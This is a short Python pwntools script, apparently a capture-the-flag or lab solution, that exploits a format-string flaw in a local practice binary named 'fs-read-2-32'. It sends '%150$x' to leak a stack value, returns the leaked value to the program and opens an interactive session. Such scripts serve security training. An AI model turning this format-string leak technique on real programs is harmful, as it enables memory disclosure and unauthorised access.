#!/usr/bin/env python

from pwn import *
import os

p = process('./fs-read-2-32')
print(p.recvline())
p.sendline('%150$x')
data=p.recvline()
print(data)
tosend=data.split(' ')[1]
print('test:')
print(tosend)
p.sendline(tosend)
p.recvline()
p.interactive()

